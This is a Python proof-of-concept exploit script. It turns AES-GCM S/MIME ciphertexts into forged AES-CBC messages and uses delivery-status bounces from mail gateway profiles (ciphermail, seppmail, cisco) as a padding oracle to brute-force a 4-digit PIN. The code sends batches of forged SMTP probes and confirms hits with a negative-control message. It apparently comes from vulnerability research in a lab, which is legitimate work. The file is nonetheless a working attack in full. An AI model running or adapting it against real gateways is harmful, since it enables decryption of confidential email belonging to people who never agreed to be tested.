#!/usr/bin/env -S authbind --deep uv run
# /// script
# dependencies = ["asn1crypto>=1.5.1", "aiosmtpd>=1.4"]
# ///
"""GCM->CBC algorithm-downgrade PIN brute force.

Encrypts a 4-digit PIN with AES-256-GCM, then forges an AES-256-CBC
EnvelopedData around the same underlying keystream/ciphertext block (CBC has
no integrity check, so this "downgrade" turns the GCM ciphertext into a
malleable CBC padding-oracle input) to batch-guess all 10000 PINs via
DSN-bounce reflection, and confirms the winning guess with a negative-control
probe that must NOT also bounce as successful.

Usage: ./padding_oracle_gcm_downgrade.py <profile> [--trials N] [--parallel N]
  profile  ciphermail | seppmail | cisco
"""

import asyncio
import sys
import time
import smtplib
from pathlib import Path

known = b': 0000\nDo not sh'
PIN_BLK = 8

_ROOT = Path(__file__).resolve().parent
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

import smime_harness_lib as H

_inner = H.inner_eml("This is your PIN: 0000\nDo not share this PIN with anyone.")
assert _inner[(PIN_BLK - 1) * 16 : PIN_BLK * 16] == known

MET = Path(".cache-metrics/padding_oracle_gcm_downgrade")

_CURRENT_BATCH = 0
PIN_BATCH = 256


def pin_guess(n: int) -> bytes:
    return known[:2] + f"{n:04d}".encode() + known[6:]


def _send_batch(conn: smtplib.SMTP, msgs: list, batch: int) -> None:
    for m in msgs:
        if _CURRENT_BATCH == batch:
            conn.send_message(m)

def forge_cbc_probe(nonce: bytes, ct: bytes, bi: int, guess: bytes) -> bytes:
    ci = H.blks(ct)[bi - 1]
    pad = bytes([H.B]) * H.B
    return H.xor(H.ctr(nonce, bi), pad) + H.xor(ci, guess)


def gcm_to_cbc_der(der: bytes, bi: int, guess: bytes) -> bytes:
    nonce, ct = H.gcm_nonce_ct(der)
    return H.pack_iv_ct(der, bytes(H.B), forge_cbc_probe(nonce, ct, bi, guess), H.AES256_CBC)


def gcm_to_cbc_der_neg(der: bytes, bi: int, guess: bytes) -> bytes:
    nonce, ct = H.gcm_nonce_ct(der)
    stream = forge_cbc_probe(nonce, ct, bi, guess)
    stream = H.xor(stream, b"A" + bytes(len(stream) - 1))
    return H.pack_iv_ct(der, bytes(H.B), stream, H.AES256_CBC)


async def batch_pins(cls, orc, der, guesses: list[int], tag: str) -> int | None:
    global _CURRENT_BATCH
    batch_id = _CURRENT_BATCH
    p = f"g-{tag}-{batch_id}"
    orc.reset(p, len(guesses), True)
    n = len(cls)
    buckets: list[list] = [[] for _ in range(n)]
    for i, g in enumerate(guesses):
        forged = gcm_to_cbc_der(der, PIN_BLK, pin_guess(g))
        msg = H.wrap_pkcs7(forged, "probe@external.test", {})
        msg["Subject"] = f"{p} {i:02x}"
        buckets[i % n].append(msg)
    send_tasks = [
        asyncio.create_task(asyncio.to_thread(_send_batch, cls[j], buckets[j], batch_id))
        for j in range(n)
        if buckets[j]
    ]
    slots = await orc.wait_slots()
    _CURRENT_BATCH += 1
    await asyncio.gather(*send_tasks)
    return [guesses[i] for i, v in enumerate(slots) if v]


async def confirm_pins(cls, orc, der, guesses: list[int], tag: str) -> int | None:
    """POC neg half: batch_pins already hit on good; reject if neg_control also hits."""
    if not guesses:
        return None
    global _CURRENT_BATCH
    batch_id = _CURRENT_BATCH
    p = f"g-{tag}-c-{batch_id}"
    orc.reset(p, len(guesses), True)
    n = len(cls)
    buckets: list[list] = [[] for _ in range(n)]
    for i, g in enumerate(guesses):
        bad = gcm_to_cbc_der_neg(der, PIN_BLK, pin_guess(g))
        msg = H.wrap_pkcs7(bad, "probe@external.test", {})
        msg["Subject"] = f"{p} {i:02x}"
        buckets[i % n].append(msg)
    send_tasks = [
        asyncio.create_task(asyncio.to_thread(_send_batch, cls[j], buckets[j], batch_id))
        for j in range(n)
        if buckets[j]
    ]
    slots = await orc.wait_slots()
    _CURRENT_BATCH += 1
    await asyncio.gather(*send_tasks)
    for i, g in enumerate(guesses):
        if not slots[i]:
            return g
    return None


async def trial(parallel: int, host, der, orc) -> bool:
    capture_host = next(c for g, c in H.PROFILES.values() if g == host)
    cls = [smtplib.SMTP(host, 25, timeout=60) for _ in range(parallel)]
    ctrl = H.start_oracle(orc, capture_host)
    try:
        for start in range(0, 10000, PIN_BATCH):
            chunk = list(range(start, min(start + PIN_BATCH, 10000)))
            possible = await batch_pins(cls, orc, der, chunk, "pin")
            if not possible:
                continue
            pin = await confirm_pins(cls, orc, der, possible, "pin")
            if pin is not None:
                print(f"PIN found: {pin:04d}")
                return True
    finally:
        ctrl.stop()
        for cl in cls:
            cl.quit()
    return False

async def go(args, guest_smtp, cert, orc):
    outs = []
    trial_s = []
    for _ in range(args.trials):
        trial_t0 = time.perf_counter()
        der = H.secret_pin_gcm(cert)
        r = await trial(args.parallel, guest_smtp, der, orc)
        elapsed_s = time.perf_counter() - trial_t0
        trial_s.append(elapsed_s)
        outs.append(r)
    return sum(x is True for x in outs), sum(x is not None for x in outs), trial_s


def main() -> None:
    a = H.argparser()
    a.add_argument("--parallel", type=int, default=5)
    args = H.parse_args(a)

    guest_smtp, _ = H.PROFILES[args.profile]
    cert = H.cert_pem(args.profile)
    orc = H.PadOracle(args.profile)

    async def _():
        t0 = time.perf_counter()
        ok, n, trial_s = await go(args, guest_smtp, cert, orc)
        timing = H.attack_timing_metrics(time.perf_counter() - t0, trial_s, None)
        print(H.metrics_json(MET, args.profile, ok=ok, n=n, **timing))

    asyncio.run(_())


if __name__ == "__main__":
    main()
